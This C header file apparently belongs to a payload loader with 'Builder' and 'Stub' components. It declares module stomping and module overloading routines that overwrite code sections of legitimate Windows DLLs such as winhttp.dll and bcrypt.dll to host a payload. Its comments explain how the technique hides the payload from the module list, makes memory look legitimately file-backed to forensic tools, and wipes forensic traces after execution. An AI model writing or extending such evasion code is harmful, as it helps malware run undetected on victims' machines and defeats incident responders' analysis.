#ifndef MODULE_STOMPING_H
#define MODULE_STOMPING_H

#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* 10-DLL pool shared between Builder and Stub.
 * Builder picks 3 indices (via --preset or RANDOM) and stores them in .rsrc.
 * Stub reads the indices and uses g_DllPool[idx] as stomp candidates.
 *
 * Index | DLL               | Group
 * ------+-------------------+----------
 *   0   | xpsservices.dll   | PRINT
 *   1   | msi.dll           | PRINT
 *   2   | dbghelp.dll       | PRINT
 *   3   | winmm.dll         | MEDIA
 *   4   | dxgi.dll          | MEDIA
 *   5   | oleaut32.dll      | MEDIA
 *   6   | winhttp.dll       | NETWORK
 *   7   | wtsapi32.dll      | NETWORK
 *   8   | wlanapi.dll       | NETWORK
 *   9   | bcrypt.dll        | CRYPTO
 */
extern const wchar_t* g_DllPool[10];

/*
 * Allocate memory via Module Stomping.
 * Loads the three DLLs identified by dll_indices (indices into g_DllPool) and
 * overrides the first executable section large enough for dwSize bytes.
 * Returns RW memory backed by a legitimate file on disk, or NULL on failure.
 *
 *  dwSize            — number of bytes needed
 *  dll_indices       — 3-byte array of indices into g_DllPool (from .rsrc metadata)
 *  ppOriginalBytes   — [out] VirtualAlloc'd buffer holding the original .text bytes
 *                      saved before stomping; the caller MUST restore and free this
 *                      after the payload is wiped.  NULL on failure to save.
 *  pOriginalBytesSz  — [out] size of ppOriginalBytes (== dwSize on success)
 *
 * After the payload is done, the caller should:
 *   1. memcpy(*ppOriginalBytes, execBuf, *pOriginalBytesSz)  — write originals back
 *   2. NtProtect(execBuf, PAGE_EXECUTE_READ)                 — restore execute bit
 *   3. VirtualFree(*ppOriginalBytes, ...)                    — release save buffer
 * This prevents DEP violations when other DLLs call into the stomped region,
 * and removes the forensic artifact of a zeroed .text section in memory.
 */
PVOID ModuleStomp_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
                        PVOID* ppOriginalBytes, SIZE_T* pOriginalBytesSz);

/*
 * Allocate memory via Module Overloading (NtCreateSection + NtMapViewOfSection).
 *
 * Maps a fresh, disk-backed copy of a pool DLL into the process WITHOUT going
 * through LoadLibraryW, so it never appears in PEB LDR.  VirtualQuery shows the
 * DLL file as the backing object (Type = MEM_IMAGE), which is indistinguishable
 * from a legitimately mapped image to memory forensics tools.
 *
 * The write target (.text section) is located and made PAGE_READWRITE via
 * NtProtect before returning, using the same copy-on-write mechanism as stomping.
 * Original bytes are saved identically so Stub.cpp can use the same restore path.
 *
 *  ppOriginalBytes   — [out] save buffer for the original .text bytes (VirtualAlloc'd)
 *  pOriginalBytesSz  — [out] size of save buffer (== dwSize on success)
 *  ppViewBase        — [out] base of the NtMapViewOfSection mapping; caller MUST call
 *                      NtUnmapViewOfSection(-1, *ppViewBase) after restore to discard
 *                      the private copy-on-write pages.
 *
 * Caller cleanup (in Stub.cpp):
 *   1. memcpy(*ppOriginalBytes → execBuf)  — write originals back
 *   2. NtProtect(execBuf, PAGE_EXECUTE_READ)
 *   3. VirtualFree(*ppOriginalBytes)
 *   4. NtUnmapViewOfSection(-1, *ppViewBase)  ← removes COW private pages
 */
PVOID ModuleOverload_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
                           PVOID* ppOriginalBytes, SIZE_T* pOriginalBytesSz,
                           PVOID* ppViewBase);

#ifdef __cplusplus
}
#endif

#endif // MODULE_STOMPING_H
